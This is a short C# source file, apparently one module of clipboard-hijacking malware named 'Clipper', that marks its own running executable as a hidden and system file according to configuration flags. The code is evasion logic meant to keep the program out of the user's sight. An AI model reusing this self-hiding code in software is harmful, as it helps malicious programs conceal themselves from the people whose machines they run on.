using System.IO;

namespace Clipper.Modules
{
    internal sealed class Attributes
    {
        
        private static string executable = System.Reflection.Assembly.GetEntryAssembly().Location;
        private static FileInfo file = new FileInfo(executable);

        
        public static void set_hidden()
        {
            if (config.attribute_hidden)
                file.Attributes |= FileAttributes.Hidden;
        }

        
        public static void set_system()
        {
            if (config.attribute_system)
                file.Attributes |= FileAttributes.System; 
        }

    }
}
